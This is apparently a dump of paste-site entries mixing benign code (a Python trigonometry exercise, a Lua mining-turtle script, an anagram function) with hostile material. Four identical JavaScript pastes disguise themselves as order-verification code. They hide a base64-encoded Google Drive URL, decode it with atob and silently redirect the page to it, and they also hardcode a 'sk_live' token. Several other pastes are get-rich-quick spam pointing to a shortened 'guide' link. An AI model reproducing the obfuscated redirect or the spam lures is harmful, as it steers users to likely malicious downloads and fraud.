id,title,username,language,date,content
VJBt03m9,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:53:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MWB3Ym1K,Make $1000 15-MINUTES (BEGINNER) FM,rmpjo3123456,JavaScript,Sunday 13th of April 2025 12:52:55 PM CDT," 
Pdf https://tinyurl.com/privguidee


MtP9jkyVeS
"
CqYK6e8a,Задача 1,dmemsm,Python,Sunday 13th of April 2025 12:48:07 PM CDT,"x, b = map(int, input().split())

t = x / b

if t == 0 or t == 1 or t == 2:
    print(""sin = 0"")
elif 0 < t < 1:
    print(""sin > 0"")
else:
    print(""sin < 0"")

if t == 0.5 or t == 1.5:
    print(""cos = 0"")
elif 0.5 < t < 1.5:
    print(""cos < 0"")
else:
    print(""cos > 0"")"
Cw9K4mfG,Spiral,Flache1,Lua,Sunday 13th of April 2025 12:47:48 PM CDT,"--range in blocks
range = 32

function failsafe()
  turtle.turnLeft()
  while turtle.forward()==false do
    turtle.dig()
  end
  while turtle.up()==false do
    turtle.digUp()
  end
  while turtle.up()==false do
    turtle.digUp()
  end
  while turtle.back()==false do
    turtle.turnRight()
    turtle.turnRight()
    turtle.dig()
    turtle.turnRight()
    turtle.turnRight()
  end
  turtle.turnRight()
  os.shutdown()
end
    
function getitem()
  for z=1,16 do
    turtle.select(z)
    if turtle.getItemCount()>0 then
      break
    end
  end
  if turtle.getItemCount()>=1 then
    return true
  else 
    return false
  end
end

--place the turtle down under the ground:
turtle.turnLeft()
while turtle.forward()==false do
  turtle.dig()
end
while turtle.down()==false do
  turtle.digDown()
end
while turtle.down()==false do
  turtle.digDown()
end
while turtle.back()==false do
  turtle.turnRight()
  turtle.turnRight()
  turtle.dig()
  turtle.turnRight()
  turtle.turnRight()
end
turtle.turnRight()

starty=8+0.25
for i=1,range*4 do
  for i=1,starty do
    if turtle.forward()==false then
      failsafe()
    end
    if turtle.getItemCount()<=0 then
      if getitem()==false then
        failsafe()
      end
    end
    if turtle.detectUp()==false and turtle.placeUp()==false then
      failsafe()
    end 
  end
  starty=starty+0.50
  turtle.turnRight()
end

failsafe()"
BTHx1Ptw,EARN $900 INSTANTLY 2025⭐ G8,rmpjo3123456,JavaScript,Sunday 13th of April 2025 12:39:31 PM CDT," 
Pdf https://tinyurl.com/privguidee


VwRezfaHrI
"
A1Du9pH1,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:38:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02624/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X4eNTea9,Make $1000 15-MINUTES (BEGINNER) FM,Nabeel10,JavaScript,Sunday 13th of April 2025 12:26:03 PM CDT," 
Pdf https://tinyurl.com/privguidee


wQXFYifCC3
"
PT3b2Q4y,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 12:23:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62309/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XsTZwasH,casualstockfarm,testbennbon,Lua,Sunday 13th of April 2025 12:22:30 PM CDT,
cT1pJbB8,EARN $900 INSTANTLY 2025⭐ G8,Nabeel10,JavaScript,Sunday 13th of April 2025 12:12:39 PM CDT," 
Pdf https://tinyurl.com/privguidee


3ArZtInS6J
"
N8nKwwyV,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 12:07:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84124/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NyHfS3zf,10.YA,miglss,Python,Sunday 13th of April 2025 12:02:13 PM CDT,"from collections import defaultdict

def solution(strs: list) -> list:
    anagrams = defaultdict(list)
    
    for s in strs:
        key = """".join(sorted(s))
        anagrams[key].append(s)
    
    return list(anagrams.values())"
